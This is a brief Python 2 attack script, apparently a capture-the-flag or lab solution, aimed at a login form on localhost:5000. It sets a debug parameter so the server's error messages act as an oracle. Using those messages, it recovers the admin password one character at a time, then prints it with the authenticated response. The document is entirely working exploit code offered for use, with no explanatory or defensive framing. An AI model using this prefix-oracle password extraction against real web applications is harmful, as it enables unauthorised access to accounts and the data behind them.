import requests

url = 'http://localhost:5000/login'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

def attempt(guess):
    result = requests.post(url, data='debug=TRUE&username=admin&password=%s' % guess,
                           headers=headers).text
    if 'failed' not in result:
        print 'Correct password found: %s' % guess
        print result
        exit()
    return 'not match' not in result

letters = 'abcdefghijklmnopqrstuvwxyz_'
done = False
guess = ''
while not done:
    for l in letters:
        tempguess = guess+l
        if attempt(tempguess):
            guess = tempguess
            break
    print 'progress: %s' % guess

